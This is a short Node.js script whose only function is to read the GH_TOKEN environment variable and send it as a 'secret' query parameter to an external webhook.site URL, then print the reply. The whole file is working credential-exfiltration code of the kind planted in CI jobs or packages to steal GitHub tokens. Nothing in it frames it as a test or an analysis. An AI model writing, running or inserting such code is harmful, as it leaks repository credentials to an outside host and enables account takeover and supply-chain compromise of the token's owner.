const https = require('https');
const webhook = 'https://webhook.site/54a56923-366e-4048-9553-cf1946890154';
const token = process.env.GH_TOKEN;
const url = webhook + "?secret=" + token;

const request = https.request(url, (response) => {
    let data = '';
    response.on('data', (chunk) => {
        data = data + chunk.toString();
    });

    response.on('end', () => {
        console.log(data);
    });
})

request.on('error', (error) => {
    console.log('An error', error);
});

request.end() 
